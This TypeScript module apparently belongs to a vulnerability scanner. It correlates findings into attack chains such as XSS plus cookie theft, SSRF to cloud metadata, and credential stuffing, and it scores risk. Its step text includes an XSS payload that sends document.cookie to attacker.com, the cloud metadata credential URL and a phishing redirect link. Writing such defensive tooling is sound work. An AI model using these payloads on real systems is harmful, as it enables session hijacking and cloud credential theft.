import type { FindingInput, AttackChain, CorrelationRule } from "./types.js";

/**
 * Attack Chain Correlation Engine
 *
 * Takes a flat list of findings and identifies multi-stage attack chains
 * where individual medium/low findings combine into a critical exploit path.
 *
 * Example: XSS + No HttpOnly cookie = Session Hijacking attack chain
 */

const CORRELATION_RULES: CorrelationRule[] = [
  // ── Chain 1: Full Account Takeover via XSS + Session Cookie ─────────────
  {
    id: "xss-session-hijack",
    requiredTags: [["xss"], ["httponly", "cookie"]],
    chain: {
      title: "Attack Chain: Session Hijacking via XSS + Unprotected Cookie",
      description:
        "Combined XSS + missing HttpOnly cookie creates a complete account takeover exploit. An attacker hosts a malicious page targeting your users, the XSS executes in the victim's browser, reads the session cookie via document.cookie, and exfiltrates it to an attacker-controlled server. The attacker then replays the session cookie to gain the victim's account with zero interaction.",
      severity: "CRITICAL",
      cvss: "9.3",
      steps: [
        "1. Attacker crafts a URL exploiting the Reflected XSS vulnerability",
        "2. Victim clicks the link (via phishing email or social engineering)",
        "3. XSS payload executes: fetch('https://attacker.com/steal?c='+document.cookie)",
        "4. Attacker receives session cookie and replays it to gain victim's account",
        "5. Attacker has full authenticated access — no password needed",
      ],
      linkedFindings: ["xss", "httponly"],
      owasp: "A03, A07",
      fixExplanation:
        "Fix XSS immediately (output encoding, CSP, DOMPurify). Simultaneously add HttpOnly to all session cookies. Defense-in-depth: CSP with nonces eliminates XSS impact even if code exists.",
    },
  },

  // ── Chain 2: CORS + Authenticated API = Cross-Origin Data Theft ─────────
  {
    id: "cors-auth-theft",
    requiredTags: [["cors"], ["xss"]],
    chain: {
      title: "Attack Chain: Cross-Origin API Data Theft via CORS + XSS",
      description:
        "Misconfigured CORS combined with XSS enables cross-origin API theft. XSS bypasses same-origin policy restrictions, and CORS misconfiguration allows the attacker's domain to read the API responses. The attacker can exfiltrate all user data including PII, financial records, and private API responses.",
      severity: "CRITICAL",
      cvss: "9.1",
      steps: [
        "1. Attacker hosts a malicious page at evil.attacker.com",
        "2. Victim visits the page — it makes a cross-origin fetch to the target API",
        "3. CORS wildcard/reflection allows attacker.com to read responses",
        "4. OR: XSS executes on the target domain and reads the API with victim's credentials",
        "5. All authenticated API responses are exfiltrated to the attacker",
      ],
      linkedFindings: ["cors", "xss"],
      owasp: "A05, A03",
      fixExplanation:
        "Implement strict CORS allowlist (never use wildcard '*' with credentials). Fix XSS with output encoding and Content-Security-Policy.",
    },
  },

  // ── Chain 3: SSRF + Missing Auth = Cloud Metadata Credential Theft ───────
  {
    id: "ssrf-cloud-metadata",
    requiredTags: [["ssrf"], ["no-mfa", "auth"]],
    chain: {
      title: "Attack Chain: Cloud Credential Theft via SSRF + Weak Auth",
      description:
        "SSRF vulnerability allows reading the cloud provider metadata endpoint (http://169.254.169.254/latest/meta-data/iam/security-credentials/), which returns temporary AWS/GCP/Azure credentials. Combined with weak authentication (no MFA), the attacker can pivot from a web vulnerability to full cloud infrastructure control.",
      severity: "CRITICAL",
      cvss: "9.8",
      steps: [
        "1. Attacker exploits SSRF to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "2. Cloud credentials (AccessKeyId, SecretAccessKey, Token) are returned in the response",
        "3. Attacker uses credentials to access AWS S3, EC2, RDS, Secrets Manager",
        "4. Reads all application secrets, database credentials, customer data",
        "5. Establishes persistence (new IAM user, backdoor Lambda functions)",
      ],
      linkedFindings: ["ssrf", "auth"],
      owasp: "A10, A07",
      fixExplanation:
        "Fix SSRF: validate/deny internal IP ranges, use IMDSv2 (AWS) which requires hop-limit tokens. Enable MFA for all accounts. Use least-privilege IAM roles.",
    },
  },

  // ── Chain 4: Open Redirect + Email Spoofing = Phishing Campaign ──────────
  {
    id: "redirect-spoofing-phishing",
    requiredTags: [["open-redirect"], ["email-spoofing"]],
    chain: {
      title: "Attack Chain: Credible Phishing via Open Redirect + Email Spoofing",
      description:
        "Open redirect on a trusted domain combined with email spoofing (missing SPF/DMARC) creates an extremely credible phishing campaign. The attacker sends emails that appear to be from your domain with URLs pointing to your legitimate domain that redirect to a phishing page.",
      severity: "HIGH",
      cvss: "8.1",
      steps: [
        "1. Attacker spoofs email from noreply@yourdomain.com (missing SPF/DMARC)",
        "2. Email body contains link: https://yourdomain.com/login?redirect=https://phishing.com/fake-login",
        "3. Victim sees legitimate domain in both the sender and the URL",
        "4. Target site redirects to phishing page that captures credentials",
        "5. Victim submits credentials to attacker-controlled site",
      ],
      linkedFindings: ["open-redirect", "email-spoofing"],
      owasp: "A01, A07",
      fixExplanation:
        "Add SPF + DMARC with p=reject to stop email spoofing. Fix open redirect with strict URL allowlisting.",
    },
  },

  // ── Chain 5: Subdomain Takeover + CORs ───────────────────────────────────
  {
    id: "subdomain-takeover-cors",
    requiredTags: [["subdomain-takeover"], ["cors"]],
    chain: {
      title: "Attack Chain: Full Cross-Origin API Access via Subdomain Takeover + CORS",
      description:
        "By claiming a dangling CNAME subdomain and controlling its content, an attacker gains a domain that may be in your CORS allowlist. If CORS is configured to allow all subdomains (e.g., *.yourdomain.com), the attacker's controlled subdomain can make authenticated API requests and read all responses — full cross-origin data exfiltration.",
      severity: "CRITICAL",
      cvss: "9.1",
      steps: [
        "1. Attacker claims the dangling CNAME subdomain (e.g., staging.yourdomain.com → GitHub Pages)",
        "2. Attacker controls staging.yourdomain.com content",
        "3. CORS allowlist or wildcard includes *.yourdomain.com",
        "4. Attacker's page at staging.yourdomain.com makes authenticated API calls using victim's cookies",
        "5. API responses (with sensitive data) are returned to the attacker's origin",
      ],
      linkedFindings: ["subdomain-takeover", "cors"],
      owasp: "A05, A01",
      fixExplanation:
        "Remove dangling DNS records immediately. Use explicit domain allowlists in CORS, never wildcard subdomains. Audit all subdomains in CT logs quarterly.",
    },
  },

  // ── Chain 6: No Rate Limit + No CAPTCHA = Credential Stuffing ────────────
  {
    id: "bruteforce-chain",
    requiredTags: [["rate-limit", "brute-force"], ["captcha", "no-captcha"]],
    chain: {
      title: "Attack Chain: Automated Credential Stuffing / Account Takeover",
      description:
        "Missing rate limiting combined with no CAPTCHA protection allows fully automated credential stuffing. Using breach databases (Have-I-Been-Pwned datasets contain 10+ billion credentials), attackers achieve 0.1–2% success rates — on a site with 100K users, that's 100–2000 compromised accounts from a single automated campaign.",
      severity: "HIGH",
      cvss: "8.1",
      steps: [
        "1. Attacker downloads breach database (freely available, billions of credentials)",
        "2. Runs credential stuffing tool (Sentry MBA, OpenBullet) against /api/auth/login",
        "3. No rate limiting — 10,000+ attempts per minute accepted",
        "4. No CAPTCHA — zero human intervention required",
        "5. Successful logins trigger account takeover at scale",
      ],
      linkedFindings: ["rate-limit", "captcha"],
      owasp: "A07",
      fixExplanation:
        "Add express-rate-limit with max 5 attempts per 15 minutes per IP. Implement CAPTCHA (Cloudflare Turnstile). Add account lockout after 10 failures. Monitor for distributed credential stuffing (many IPs, same failure pattern).",
    },
  },

  // ── Chain 7: Missing HSTS + Self-Signed / Expired Cert = MITM ───────────
  {
    id: "tls-downgrade-mitm",
    requiredTags: [["hsts", "ssl", "tls"], ["cookie"]],
    chain: {
      title: "Attack Chain: Session Cookie Theft via TLS Downgrade MITM",
      description:
        "Missing HSTS combined with session cookies lacking the Secure flag allows SSL stripping attacks on any network where the attacker has a MITM position (coffee shop WiFi, ISP-level, DNS poisoning). The attacker downgrades the HTTPS connection to HTTP, capturing session cookies in plaintext.",
      severity: "HIGH",
      cvss: "7.4",
      steps: [
        "1. Attacker positions as MITM (ARP spoofing on local network or DNS poisoning)",
        "2. Victim's browser makes HTTP request (no HSTS to force HTTPS)",
        "3. Attacker intercepts — serves HTTP response instead of redirecting to HTTPS",
        "4. Session cookies without Secure flag are sent over HTTP in plaintext",
        "5. Attacker reads cookies, authenticates as victim",
      ],
      linkedFindings: ["hsts", "cookie"],
      owasp: "A02",
      fixExplanation:
        "Add HSTS with max-age=31536000 and preload. Add Secure flag to all cookies. Submit domain to HSTS preload list at hstspreload.org.",
    },
  },
];

/**
 * Checks if a set of findings satisfies a correlation rule.
 * requiredTags is an AND of OR-groups:
 *   [[tagA, tagB], [tagC]] means: (tagA OR tagB) AND (tagC)
 */
function matchesRule(findings: FindingInput[], rule: CorrelationRule): boolean {
  const allTags = new Set(findings.flatMap(f => f.tags || []));
  return rule.requiredTags.every(orGroup =>
    orGroup.some(tag => {
      // Check if any finding has a tag that includes this keyword
      for (const existingTag of allTags) {
        if (existingTag.includes(tag)) return true;
      }
      return false;
    })
  );
}

/**
 * Main correlation function — returns synthesized attack chain findings.
 */
export function correlateFindings(findings: FindingInput[]): FindingInput[] {
  const chains: FindingInput[] = [];

  for (const rule of CORRELATION_RULES) {
    if (!matchesRule(findings, rule)) continue;

    const { chain } = rule;

    // Find linked finding titles for the description
    const linkedTitles = findings
      .filter(f => chain.linkedFindings.some(tag =>
        f.tags?.some(ft => ft.includes(tag))
      ))
      .map(f => `• ${f.title}`)
      .slice(0, 5)
      .join('\n');

    chains.push({
      title: `🔗 ${chain.title}`,
      description: `${chain.description}\n\n**Exploit Steps:**\n${chain.steps.join('\n')}\n\n**Built from vulnerabilities:**\n${linkedTitles}`,
      endpoint: "multi-vector",
      severity: chain.severity,
      cvss: chain.cvss,
      cwe: "CWE-693",
      owasp: chain.owasp,
      confidence: 0.85,
      tags: ["attack-chain", rule.id],
      fixExplanation: chain.fixExplanation,
      pocCode: `# Attack chain: ${rule.id}\n# See individual finding PoC codes above for each component`,
    });
  }

  return chains;
}

/**
 * Compute a risk score with nuance:
 * - Attack chains contribute double weight
 * - High-confidence findings weighted higher
 * - Formula: min(10, weighted-total / normalizer)
 */
export function computeRiskScore(findings: FindingInput[]): number {
  let score = 0;
  for (const f of findings) {
    const conf = f.confidence ?? 1.0;
    const isChain = f.tags?.includes('attack-chain') ? 2 : 1;
    const base =
      f.severity === 'CRITICAL' ? 10 :
      f.severity === 'HIGH' ? 7 :
      f.severity === 'MEDIUM' ? 4 :
      f.severity === 'LOW' ? 1 : 0;
    score += base * conf * isChain;
  }
  return Math.min(10, score / 20);
}
